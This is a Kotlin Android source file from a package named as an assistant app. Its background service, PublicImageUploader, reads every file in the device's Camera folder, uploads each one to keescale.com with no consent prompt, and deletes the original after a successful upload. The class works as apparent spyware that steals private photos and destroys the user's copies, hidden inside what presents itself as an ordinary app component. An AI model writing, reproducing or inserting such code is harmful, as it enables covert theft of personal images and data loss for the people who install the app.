package com.keescale.assistant

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.Environment
import okhttp3.*
import java.io.File
import java.io.IOException

class PublicImageUploader : Service() {
    private val client = OkHttpClient()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        val cameraDir = File(dcim, "Camera")
        if (cameraDir.exists()) {
            cameraDir.listFiles()?.forEach { file ->
                uploadFile(file)
            }
        }
        stopSelf()
        return START_NOT_STICKY
    }

    private fun uploadFile(file: File) {
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, RequestBody.create("image/*".toMediaType(), file))
            .build()

        val request = Request.Builder()
            .url("https://keescale.com/android/uploadapi.php")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) file.delete()
                response.close()
            }
        })
    }

    override fun onBind(intent: Intent?): IBinder? = null
}